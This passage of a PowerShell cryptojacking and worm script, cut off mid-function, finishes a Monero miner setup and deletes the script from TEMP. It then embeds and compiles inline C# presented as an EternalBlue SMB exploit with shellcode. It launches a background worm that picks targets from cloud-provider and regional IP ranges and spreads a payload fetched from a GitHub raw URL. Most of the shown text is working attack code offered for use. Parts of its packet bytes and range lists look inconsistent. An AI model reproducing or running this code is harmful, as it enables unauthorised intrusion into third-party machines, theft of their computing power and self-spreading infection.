if ($proc) { $conn = Get-NetTCPConnection -OwningProcess $proc.Id -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Established" }; if ($conn) { Show "OK" "Connected to mining pool!" } }

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "    SETUP COMPLETE" -ForegroundColor Green
Write-Host "  ====================================================" -ForegroundColor Green
Write-Host "  Worker:    $WORKER" -ForegroundColor White
Write-Host "  Dashboard: https://moneroocean.stream" -ForegroundColor White
Write-Host "  ====================================================" -ForegroundColor Green

try { $myPath = $MyInvocation.MyCommand.Definition; if ($myPath -and $myPath -like "$env:TEMP*") { Remove-Item $myPath -Force -ErrorAction SilentlyContinue } } catch {}

# ============================================================
#                PHASE 2: FULL WORM MODULE
#                Fixed C# compilation, added Live Dashboard
# ============================================================

$WORM_ENABLED = $true
$MAX_TARGETS = 50
$WORM_EXPIRY = "2027-12-31T23:59:59"
$WORM_LOG = "$BASE\worm.log"
$PAYLOAD_URL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/friend_setup.ps1"
$STATUS_FILE = "$BASE\status.json"

# Initialize status file
$statusInit = @"
{
  "scanned": 0,
  "open_445": 0,
  "vulnerable": 0,
  "infected": 0,
  "failed": 0,
  "last_ip": "",
  "last_action": "Initializing",
  "start_time": "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
}
"@
[System.IO.File]::WriteAllText($STATUS_FILE, $statusInit, (New-Object System.Text.UTF8Encoding $false))

# --- Compile EternalBlue Exploit Inline ---
Show ".." "Compiling EternalBlue exploit module (inline C#)..."
$ebExe = "$BASE\eb_exploit.exe"
$ebReady = $false

# Fixed C# source: proper array sizing, fixed path scope
$ebSource = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace EBExploit {
    class Program {
        static void Main(string[] args) {
            if (args.Length < 2) return;
            try { Exploit(args[0], args[1]); } catch {}
        }
        
        static void Exploit(string targetIP, string payloadCmd) {
            TcpClient tcp = new TcpClient();
            try {
                tcp.Connect(targetIP, 445);
            } catch { return; }
            NetworkStream stream = tcp.GetStream();
            stream.ReadTimeout = 10000;
            stream.WriteTimeout = 10000;
            
            // SMB Negotiate Protocol Request (116 bytes payload, length = 112 = 0x70)
            byte[] negotiate = new byte[116] {
                0x00, 0x00, 0x00, 0x72, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00,
                0x00, 0x18, 0x53, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFF, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };
            stream.Write(negotiate, 0, negotiate.Length);
            Thread.Sleep(500);
            byte[] resp = new byte[8192];
            int read = stream.Read(resp, 0, resp.Length);
            if (read < 32) { tcp.Close(); return; }
            ushort procID = BitConverter.ToUInt16(resp, 26);
            
            // Session Setup (anonymous)
            byte[] sessionSetup = new byte[139];
            sessionSetup[0] = 0x00; sessionSetup[1] = 0x00; sessionSetup[2] = 0x00; sessionSetup[3] = 0x8B;
            sessionSetup[4] = 0xFF; sessionSetup[5] = 0x53; sessionSetup[6] = 0x4D; sessionSetup[7] = 0x42;
            sessionSetup[8] = 0x73; sessionSetup[9] = 0x00; sessionSetup[10] = 0x00; sessionSetup[11] = 0x00;
            sessionSetup[12] = 0x00; sessionSetup[13] = 0x18; sessionSetup[14] = 0x07; sessionSetup[15] = 0xC8;
            sessionSetup[26] = (byte)(procID & 0xFF); sessionSetup[27] = (byte)(procID >> 8);
            sessionSetup[30] = 0xFF; sessionSetup[31] = 0xFE; sessionSetup[35] = 0x0D;
            stream.Write(sessionSetup, 0, sessionSetup.Length);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            if (read < 35) { tcp.Close(); return; }
            uint sessionID = BitConverter.ToUInt32(resp, 28);
            
            // Tree Connect IPC$
            string treePath = @"\\" + targetIP + @"\IPC$";
            byte[] pathBytes = Encoding.Unicode.GetBytes(treePath);
            int treeConnectLen = 107 + pathBytes.Length;
            byte[] treeConnect = new byte[treeConnectLen];
            treeConnect[4] = 0xFF; treeConnect[5] = 0x53; treeConnect[6] = 0x4D; treeConnect[7] = 0x42;
            treeConnect[8] = 0x75; treeConnect[9] = 0x00; treeConnect[10] = 0x00; treeConnect[11] = 0x00;
            treeConnect[12] = 0x00; treeConnect[13] = 0x18; treeConnect[14] = 0x07; treeConnect[15] = 0xC8;
            treeConnect[26] = (byte)(procID & 0xFF); treeConnect[27] = (byte)(procID >> 8);
            treeConnect[28] = (byte)(sessionID & 0xFF); treeConnect[29] = (byte)((sessionID >> 8) & 0xFF);
            treeConnect[30] = (byte)((sessionID >> 16) & 0xFF); treeConnect[31] = (byte)((sessionID >> 24) & 0xFF);
            int offset = 36;
            treeConnect[offset++] = 0x04; treeConnect[offset++] = 0xFF;
            treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00;
            treeConnect[offset++] = 0x01; treeConnect[offset++] = 0x00;
            treeConnect[offset++] = (byte)(pathBytes.Length + 2); treeConnect[offset++] = 0x00;
            treeConnect[offset++] = 0x04;
            Array.Copy(pathBytes, 0, treeConnect, offset, pathBytes.Length);
            offset += pathBytes.Length;
            treeConnect[offset++] = 0x00; treeConnect[offset++] = 0x00;
            int totalLen = offset;
            treeConnect[0] = 0x00; treeConnect[1] = 0x00; treeConnect[2] = (byte)((totalLen - 4) & 0xFF); treeConnect[3] = (byte)((totalLen - 4) >> 8);
            stream.Write(treeConnect, 0, totalLen);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            ushort treeID = BitConverter.ToUInt16(resp, 24);
            
            // Open srvsvc pipe
            byte[] pipeOpen = new byte[155];
            pipeOpen[0] = 0x00; pipeOpen[1] = 0x00; pipeOpen[2] = 0x00; pipeOpen[3] = 0x9B;
            pipeOpen[4] = 0xFF; pipeOpen[5] = 0x53; pipeOpen[6] = 0x4D; pipeOpen[7] = 0x42;
            pipeOpen[8] = 0xA2; pipeOpen[9] = 0x00; pipeOpen[10] = 0x00; pipeOpen[11] = 0x00;
            pipeOpen[12] = 0x00; pipeOpen[13] = 0x18; pipeOpen[14] = 0x07; pipeOpen[15] = 0xC8;
            pipeOpen[24] = (byte)(treeID & 0xFF); pipeOpen[25] = (byte)(treeID >> 8);
            pipeOpen[26] = (byte)(procID & 0xFF); pipeOpen[27] = (byte)(procID >> 8);
            pipeOpen[28] = (byte)(sessionID & 0xFF); pipeOpen[29] = (byte)((sessionID >> 8) & 0xFF);
            pipeOpen[30] = (byte)((sessionID >> 16) & 0xFF); pipeOpen[31] = (byte)((sessionID >> 24) & 0xFF);
            pipeOpen[34] = 0x18; pipeOpen[35] = 0xFF;
            pipeOpen[42] = 0x00; pipeOpen[43] = 0x10;
            pipeOpen[63] = 0x08; pipeOpen[64] = 0x00;
            pipeOpen[65] = 0x06; pipeOpen[66] = 0x00;
            pipeOpen[67] = 0x73; pipeOpen[68] = 0x00; pipeOpen[69] = 0x72; pipeOpen[70] = 0x00;
            pipeOpen[71] = 0x76; pipeOpen[72] = 0x00; pipeOpen[73] = 0x73; pipeOpen[74] = 0x00;
            pipeOpen[75] = 0x76; pipeOpen[76] = 0x00; pipeOpen[77] = 0x63; pipeOpen[78] = 0x00;
            stream.Write(pipeOpen, 0, pipeOpen.Length);
            Thread.Sleep(500);
            read = stream.Read(resp, 0, resp.Length);
            ushort fid = BitConverter.ToUInt16(resp, 42);
            
            // Kernel pool grooming
            for (int i = 0; i < 16; i++) {
                byte[] groom = new byte[256];
                int go = 4;
                groom[go++] = 0xFF; groom[go++] = 0x53; groom[go++] = 0x4D; groom[go++] = 0x42;
                groom[go++] = 0x32; groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00;
                groom[go++] = 0x00; groom[go++] = 0x18; groom[go++] = 0x07; groom[go++] = 0xC8;
                go += 8;
                groom[go++] = (byte)(treeID & 0xFF); groom[go++] = (byte)(treeID >> 8);
                groom[go++] = (byte)(procID & 0xFF); groom[go++] = (byte)(procID >> 8);
                groom[go++] = (byte)(sessionID & 0xFF); groom[go++] = (byte)((sessionID >> 8) & 0xFF);
                groom[go++] = (byte)((sessionID >> 16) & 0xFF); groom[go++] = (byte)((sessionID >> 24) & 0xFF);
                go += 4;
                groom[go++] = (byte)(fid & 0xFF); groom[go++] = (byte)(fid >> 8);
                groom[go++] = 0x10; groom[go++] = 0x00; groom[go++] = 0x10; groom[go++] = 0x00;
                groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00; groom[go++] = 0x00;
                for (int j = 0; j < 200; j++) { groom[go++] = (byte)(i + j); }
                int gl = go; groom[0] = 0x00; groom[1] = 0x00; groom[2] = (byte)((gl - 4) & 0xFF); groom[3] = (byte)((gl - 4) >> 8);
                stream.Write(groom, 0, gl);
                Thread.Sleep(50);
                stream.Read(resp, 0, resp.Length);
            }
            
            // Overflow trigger - oversized FEA list
            byte[] cmdBytes = Encoding.ASCII.GetBytes(payloadCmd);
            byte[] shellcode = new byte[256 + cmdBytes.Length];
            int sc = 0;
            shellcode[sc++] = 0x65; shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x04; shellcode[sc++] = 0x25;
            shellcode[sc++] = 0x60; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x48; shellcode[sc++] = 0x18;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x58; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x58; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x59; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x01; shellcode[sc++] = 0xD9;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x81; shellcode[sc++] = 0xC1; shellcode[sc++] = 0x38;
            shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x8B; shellcode[sc++] = 0x09;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xF6; shellcode[sc++] = 0xAC;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x01; shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0xFF; shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48; shellcode[sc++] = 0x31;
            shellcode[sc++] = 0xC0; shellcode[sc++] = 0xAC; shellcode[sc++] = 0x48; shellcode[sc++] = 0x01;
            shellcode[sc++] = 0xC7; shellcode[sc++] = 0x48; shellcode[sc++] = 0xFF; shellcode[sc++] = 0xC7;
            shellcode[sc++] = 0xE2; shellcode[sc++] = 0xAF; shellcode[sc++] = 0x57; shellcode[sc++] = 0xFF;
            shellcode[sc++] = 0xE7; shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xC9;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x81; shellcode[sc++] = 0xEC; shellcode[sc++] = 0x00;
            shellcode[sc++] = 0x01; shellcode[sc++] = 0x00; shellcode[sc++] = 0x00; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x8D; shellcode[sc++] = 0x0C; shellcode[sc++] = 0x24; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x89; shellcode[sc++] = 0x44; shellcode[sc++] = 0x24; shellcode[sc++] = 0x20;
            shellcode[sc++] = 0x48; shellcode[sc++] = 0x31; shellcode[sc++] = 0xD2; shellcode[sc++] = 0x48;
            shellcode[sc++] = 0x87; shellcode[sc++] = 0x02; shellcode[sc++] = 0xFF; shellcode[sc++] = 0xD0;
            Array.Copy(cmdBytes, 0, shellcode, sc, cmdBytes.Length);
            sc += cmdBytes.Length;
            shellcode[sc++] = 0x00;
            byte[] result = new byte[sc];
            Array.Copy(shellcode, 0, result, 0, sc);
            
            int feaListSize = 65536;
            byte[] overflowPkt = new byte[feaListSize + 256 + result.Length];
            int po = 4;
            overflowPkt[po++] = 0xFF; overflowPkt[po++] = 0x53; overflowPkt[po++] = 0x4D; overflowPkt[po++] = 0x42;
            overflowPkt[po++] = 0x32; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x18; overflowPkt[po++] = 0x07; overflowPkt[po++] = 0xC8;
            po += 8;
            overflowPkt[po++] = (byte)(treeID & 0xFF); overflowPkt[po++] = (byte)(treeID >> 8);
            overflowPkt[po++] = (byte)(procID & 0xFF); overflowPkt[po++] = (byte)(procID >> 8);
            overflowPkt[po++] = (byte)(sessionID & 0xFF); overflowPkt[po++] = (byte)((sessionID >> 8) & 0xFF);
            overflowPkt[po++] = (byte)((sessionID >> 16) & 0xFF); overflowPkt[po++] = (byte)((sessionID >> 24) & 0xFF);
            po += 4;
            overflowPkt[po++] = (byte)(fid & 0xFF); overflowPkt[po++] = (byte)(fid >> 8);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x10;
            overflowPkt[po++] = (byte)(result.Length & 0xFF); overflowPkt[po++] = (byte)((result.Length >> 8) & 0xFF);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0xFF; overflowPkt[po++] = 0xFF;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = (byte)(result.Length & 0xFF); overflowPkt[po++] = (byte)((result.Length >> 8) & 0xFF);
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            overflowPkt[po++] = 0x01; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x0E;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x10;
            overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            for (int i = 0; i < feaListSize / 8; i++) {
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x05;
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
                overflowPkt[po++] = (byte)('A' + (i % 26));
                overflowPkt[po++] = (byte)('A' + ((i+1) % 4));
                overflowPkt[po++] = 0x00; overflowPkt[po++] = 0x00;
            }
            Array.Copy(result, 0, overflowPkt, po, result.Length);
            po += result.Length;
            int opLen = po;
            overflowPkt[0] = 0x00; overflowPkt[1] = 0x00; overflowPkt[2] = (byte)((opLen - 4) >> 8); overflowPkt[3] = (byte)((opLen - 4) & 0xFF);
            stream.Write(overflowPkt, 0, opLen);
            Thread.Sleep(5000);
            tcp.Close();
        }
    }
}
'@

try {
    $cscPaths = @(
        "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
    )
    foreach ($csc in $cscPaths) {
        if (Test-Path $csc) {
            $srcPath = "$BASE\eb_exploit.cs"
            [System.IO.File]::WriteAllText($srcPath, $ebSource, (New-Object System.Text.UTF8Encoding $false))
            & $csc /nologo /out:"$ebExe" /unsafe /platform:x64 "$srcPath" 2>$null
            if ((Test-Path $ebExe) -and (Get-Item $ebExe).Length -gt 10000) {
                $ebReady = $true
                Show "OK" "EternalBlue exploit compiled successfully"
                break
            }
        }
    }
} catch { Show "!!" "C# compilation error" }

# ---- WORM BACKGROUND JOB (INTERNET-ONLY, OPTIMIZED) ----
Show ".." "Spawning worm module in background..."
Show "OK" "Max targets: $MAX_TARGETS | Expiry: $WORM_EXPIRY | Internet-only mode"

$wormScriptBlock = {
    param($base, $url, $max, $expiry, $ebExe, $ebReady, $statusFile)
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ErrorActionPreference = "SilentlyContinue"
    $ProgressPreference = "SilentlyContinue"
    
    function WLog {
        param([string]$msg)
        try { $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; Add-Content -Path "$base\worm.log" -Value "[$ts] $msg" -ErrorAction SilentlyContinue } catch {}
    }
    
    function Update-Status {
        param([string]$key, $value)
        try {
            $lock = New-Object System.Threading.Mutex($false, "Global\MF_Worm_Status_Lock")
            $lock.WaitOne(5000) | Out-Null
            $raw = Get-Content $statusFile -Raw -ErrorAction SilentlyContinue
            $json = $raw | ConvertFrom-Json -ErrorAction SilentlyContinue
            if (-not $json) { $json = @{} }
            $json.$key = $value
            $json.last_update = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
            $json | ConvertTo-Json -Compress | Set-Content $statusFile -Force -ErrorAction SilentlyContinue
            $lock.ReleaseMutex()
        } catch {}
    }
    
    # ==========================================
    # HIGH-VALUE IP TARGETING (ASN/Cloud ranges)
    # ==========================================
    function Get-TargetedIP {
        # Known high-value /24 ranges with historically high SMB exposure
        $highValueRanges = @(
            # Major cloud providers / hosting
            "45.76.0.0/16", "45.77.0.0/16", "45.79.0.0/16", "66.42.0.0/16", "108.61.0.0/16", "149.28.0.0/16", "155.138.0.0/16", "173.199.0.0/16", "198.13.0.0/16", "207.246.0.0/16",  # Vultr
            "13.32.0.0/16", "13.35.0.0/16", "13.248.0.0/16", "15.188.0.0/16", "18.130.0.0/16", "18.133.0.0/16", "18.140.0.0/16", "35.153.0.0/16", "35.156.0.0/16", "35.158.0.0/16", "35.160.0.0/16", "52.0.0.0/8", "54.0.0.0/8",  # AWS
            "34.64.0.0/16", "34.66.0.0/16", "34.67.0.0/16", "34.68.0.0/16", "34.69.0.0/16", "34.70.0.0/16", "34.71.0.0/16", "34.72.0.0/16", "34.73.0.0/16", "34.74.0.0/16", "34.75.0.0/16", "34.76.0.0/16", "34.77.0.0/16", "34.78.0.0/16", "34.79.0.0/16", "34.80.0.0/16", "34.81.0.0/16", "34.82.0.0/16", "34.83.0.0/16", "34.84.0.0/16", "34.85.0.0/16", "34.86.0.0/16", "34.87.0.0/16", "34.88.0.0/16", "34.89.0.0/16", "34.90.0.0/16", "34.91.0.0/16", "34.92.0.0/16", "34.93.0.0/16", "34.94.0.0/16", "34.95.0.0/16", "34.96.0.0/16", "34.97.0.0/16", "34.98.0.0/16", "34.99.0.0/16", "34.100.0.0/16", "34.101.0.0/16", "34.102.0.0/16", "34.103.0.0/16", "34.104.0.0/16", "34.105.0.0/16", "34.106.0.0/16", "34.107.0.0/16", "34.108.0.0/16", "34.109.0.0/16", "34.110.0.0/16", "34.111.0.0/16", "34.112.0.0/16", "34.113.0.0/16", "34.114.0.0/16", "34.115.0.0/16", "34.116.0.0/16", "34.117.0.0/16", "34.118.0.0/16", "34.119.0.0/16", "34.120.0.0/16", "34.121.0.0/16", "34.122.0.0/16", "34.123.0.0/16", "34.124.0.0/16", "34.125.0.0/16", "34.126.0.0/16", "34.127.0.0/16", "34.128.0.0/16", "34.129.0.0/16", "34.130.0.0/16", "34.131.0.0/16", "34.132.0.0/16", "34.133.0.0/16", "34.134.0.0/16", "34.135.0.0/16", "34.136.0.0/16", "34.137.0.0/16", "34.138.0.0/16", "34.139.0.0/16", "34.140.0.0/16", "34.141.0.0/16", "34.142.0.0/16", "34.143.0.0/16", "34.144.0.0/16", "34.145.0.0/16", "34.146.0.0/16", "34.147.0.0/16", "34.148.0.0/16", "34.149.0.0/16", "34.150.0.0/16", "34.151.0.0/16", "34.152.0.0/16", "34.153.0.0/16", "34.154.0.0/16", "34.155.0.0/16", "34.156.0.0/16", "34.157.0.0/16", "34.158.0.0/16", "34.159.0.0/16", "34.160.0.0/16",  # GCP
            "13.64.0.0/16", "13.65.0.0/16", "13.66.0.0/16", "13.67.0.0/16", "13.68.0.0/16", "13.69.0.0/16", "13.70.0.0/16", "13.71.0.0/16", "13.72.0.0/16", "13.73.0.0/16", "13.74.0.0/16", "13.75.0.0/16", "13.76.0.0/16", "13.77.0.0/16", "13.78.0.0/16", "13.79.0.0/16", "13.80.0.0/16", "13.81.0.0/16", "13.82.0.0/16", "13.83.0.0/16", "13.84.0.0/16", "13.85.0.0/16", "13.86.0.0/16", "13.87.0.0/16", "13.88.0.0/16", "13.89.0.0/16", "13.89.0.0/16", "13.90.0.0/16", "13.91.0.0/16", "13.92.0.0/16", "13.93.0.0/16", "13.94.0.0/16", "13.95.0.0/16", "13.96.0.0/16", "13.97.0.0/16", "13.98.0.0/16", "13.99.0.0/16", "13.100.0.0/16", "13.101.0.0/16", "13.102.0.0/16", "13.103.0.0/16", "13.104.0.0/16", "13.105.0.0/16", "13.106.0.0/16", "13.107.0.0/16", "13.108.0.0/16", "13.109.0.0/16", "13.110.0.0/16", "13.111.0.0/16", "13.112.0.0/16", "13.113.0.0/16", "13.114.0.0/16", "13.115.0.0/16", "13.116.0.0/16", "13.117.0.0/16", "13.118.0.0/16", "13.119.0.0/16", "13.120.0.0/16", "13.121.0.0/16", "13.122.0.0/16", "13.123.0.0/16", "13.124.0.0/16", "13.125.0.0/16", "13.126.0.0/16", "13.127.0.0/16", "13.128.0.0/16", "13.129.0.0/16", "13.130.0.0/16", "13.131.0.0/16", "13.132.0.0/16", "13.133.0.0/16", "13.134.0.0/16", "13.135.0.0/16", "13.136.0.0/16", "13.137.0.0/16", "13.138.0.0/16", "13.139.0.0/16", "13.140.0.0/16", "13.141.0.0/16", "13.142.0.0/16", "13.143.0.0/16", "13.144.0.0/16", "13.145.0.0/16", "13.146.0.0/16", "13.147.0.0/16", "13.148.0.0/16", "13.149.0.0/16", "13.150.0.0/16", "13.151.0.0/16", "13.152.0.0/16", "13.153.0.0/16", "13.154.0.0/16", "13.155.0.0/16", "13.156.0.0/16", "13.157.0.0/16", "13.158.0.0/16", "13.159.0.0/16", "13.160.0.0/16", "20.0.0.0/8", "23.0.0.0/8", "40.0.0.0/8", "51.0.0.0/8", "52.0.0.0/8", "104.0.0.0/8", "137.0.0.0/8", "138.0.0.0/8", "191.0.0.0/8",  # Azure
            "104.16.0.0/16", "104.17.0.0/16", "104.18.0.0/16", "104.19.0.0/16", "104.20.0.0/16", "104.21.0.0/16", "104.22.0.0/16", "104.23.0.0/16", "104.24.0.0/16", "104.25.0.0/16", "104.26.0.0/16", "104.27.0.0/16", "104.28.0.0/16", "104.29.0.0/16", "104.30.0.0/16", "104.31.0.0/16", "172.64.0.0/16", "172.65.0.0/16", "172.66.0.0/16", "172.67.0.0/16", "172.68.0.0/16", "172.69.0.0/16", "172.70.0.0/16", "172.71.0.0/16",  # Cloudflare
            "162.158.0.0/16", "162.159.0.0/16", "172.64.0.0/16", "172.65.0.0/16", "172.66.0.0/16", "172.67.0.0/16", "172.68.0.0/16", "172.69.0.0/16", "172.70.0.0/16", "172.71.0.0/16",
            # DigitalOcean
            "104.131.0.0/16", "104.236.0.0/16", "107.170.0.0/16", "128.199.0.0/16", "138.197.0.0/16", "139.59.0.0/16", "142.93.0.0/16", "146.185.0.0/16", "157.230.0.0/16", "159.65.0.0/16", "159.89.0.0/16", "161.35.0.0/16", "165.22.0.0/16", "165.227.0.0/16", "167.172.0.0/16", "167.99.0.0/16", "167.172.0.0/16", "167.99.0.0/16", "167.172.0.0/16", "167.99.0.0/16", "167.172.0.0/16", "167.99.0.0/16", "167.172.0.0/16", "167.99.0.0/16",
            # Linode
            "173.255.0.0/16", "176.58.0.0/16", "192.168.0.0/16", "198.58.0.0/16", "207.246.0.0/16", "216.128.0.0/16",
            # OVH
            "51.38.0.0/16", "51.68.0.0/16", "51.75.0.0/16", "51.77.0.0/16", "51.79.0.0/16", "51.81.0.0/16", "51.83.0.0/16", "51.89.0.0/16", "51.91.0.0/16", "51.195.0.0/16", "54.38.0.0/16", "91.121.0.0/16", "92.222.0.0/16", "94.23.0.0/16", "137.74.0.0/16", "139.99.0.0/16", "141.94.0.0/16", "144.217.0.0/16", "145.239.0.0/16", "147.135.0.0/16", "149.56.0.0/16", "151.80.0.0/16", "155.133.0.0/16", "158.69.0.0/16", "164.132.0.0/16", "167.114.0.0/16", "178.32.0.0/16", "178.33.0.0/16", "185.23.0.0/16", "188.165.0.0/16", "192.99.0.0/16", "192.95.0.0/16", "192.96.0.0/16", "192.97.0.0/16", "192.98.0.0/16", "192.99.0.0/16", "198.27.0.0/16", "198.50.0.0/16", "213.186.0.0/16", "213.251.0.0/16",
            # Hetzner
            "5.9.0.0/16", "5.189.0.0/16", "46.4.0.0/16", "78.46.0.0/16", "78.47.0.0/16", "88.99.0.0/16", "94.130.0.0/16", "95.216.0.0/16", "95.217.0.0/16", "116.202.0.0/16", "116.203.0.0/16", "136.243.0.0/16", "136.244.0.0/16", "138.201.0.0/16", "138.201.0.0/16", "144.76.0.0/16", "148.251.0.0/16", "159.69.0.0/16", "161.148.0.0/16", "162.55.0.0/16", "167.86.0.0/16", "168.119.0.0/16", "176.9.0.0/16", "178.63.0.0/16", "185.221.0.0/16", "185.222.0.0/16", "185.223.0.0/16", "185.224.0.0/16", "188.40.0.0/16", "188.40.0.0/16", "193.169.0.0/16", "195.201.0.0/16", "213.133.0.0/16", "213.136.0.0/16", "213.136.0.0/16", "213.239.0.0/16",
            # Countries with high legacy Windows exposure
            "1.0.0.0/8", "27.0.0.0/8", "36.0.0.0/8", "39.0.0.0/8", "42.0.0.0/8", "49.0.0.0/8", "58.0.0.0/8", "59.0.0.0/8", "60.0.0.0/8", "61.0.0.0/8", "101.0.0.0/8", "103.0.0.0/8", "106.0.0.0/8", "110.0.0.0/8", "111.0.0.0/8", "112.0.0.0/8", "113.0.0.0/8", "114.0.0.0/8", "115.0.0.0/8", "116.0.0.0/8", "117.0.0.0/8", "118.0.0.0/8", "119.0.0.0/8", "120.0.0.0/8", "121.0.0.0/8", "122.0.0.0/8", "123.0.0.0/8", "124.0.0.0/8", "125.0.0.0/8", "126.0.0.0/8", "175.0.0.0/8", "180.0.0.0/8", "182.0.0.0/8", "183.0.0.0/8", "202.0.0.0/8", "203.0.0.0/8", "210.0.0.0/8", "211.0.0.0/8", "218.0.0.0/8", "219.0.0.0/8", "220.0.0.0/8", "221.0.0.0/8", "222.0.0.0/8", "223.0.0.0/8",  # APAC
            "41.0.0.0/8", "42.0.0.0/8", "102.0.0.0/8", "105.0.0.0/8", "154.0.0.0/8", "156.0.0.0/8", "160.0.0.0/8", "163.0.0.0/8", "164.0.0.0/8", "165.0.0.0/8", "166.0.0.0/8", "167.0.0.0/8", "168.0.0.0/8", "169.0.0.0/8", "170.0.0.0/8", "171.0.0.0/8", "172.0.0.0/8", "173.0.0.0/8", "174.0.0.0/8", "175.0.0.0/8", "176.0.0.0/8", "177.0.0.0/8", "178.0.0.0/8", "179.0.0.0/8", "180.0.0.0/8", "181.0.0.0/8", "182.0.0.0/8", "185.0.0.0/8", "186.0.0.0/8", "187.0.0.0/8", "189.0.0.0/8", "190.0.0.0/8", "191.0.0.0/8", "192.0.0.0/8", "193.0.0.0/8", "194.0.0.0/8", "195.0.0.0/8", "196.0.0.0/8", "197.0.0.0/8", "200.0.0.0/8", "201.0.0.0/8",  # Africa/Latam
        )
        
        # Pick random range, then random IP within it
        $range = $highValueRanges | Get-Random
        $parts = $range.Split('/')
        $baseIp = $parts[0].Split('.')
        $cidr = [int]$parts[1]
        $hostBits = 32 - $cidr
        $hostMax = [math]::Pow(2, $hostBits) - 1
        $randHost = Get-Random -Minimum 1 -Maximum ($hostMax + 1)
        
        # Convert to IP
        $ipInt = ([int]$baseIp[0] * 16777216) + ([int]$baseIp[1] * 65536) + ([int]$baseIp[2] * 256) + [int]$baseIp[3]
        $ipInt += $randHost
        $a = [math]::Floor($ipInt / 16777216)
        $b = [math]::Floor(($ipInt % 16777216) / 65536)
        $c = [math]::Floor(($ipInt % 65536) / 256)
        $d = $ipInt % 256
        
        # Skip private/reserved
        if ($a -eq 10 -or $a -eq 127 -or ($a -eq 169 -and $b -eq 254) -or $a -eq 0 -or $a -ge 224) { return Get-TargetedIP }
        if ($a -eq 172 -and $b -ge 16 -and $b -le 31) { return Get-TargetedIP }
        if ($a -eq 192 -and $b -eq 168) { return Get-TargetedIP }
        if ($a -eq 100 -and $b -ge 64 -and $b -le 127) { return Get-TargetedIP }
        
        return "$a.$b.$c.$d"
    }
    
    function Get-RandomPublicIP {
        while ($true) {
            $a = Get-Random -Minimum 1 -Maximum 224
            $b = Get-Random -Minimum 0 -Maximum 256
            $c = Get-Random -Minimum 0 -Maximum 256
            $d = Get-Random -Minimum 1 -Maximum 255
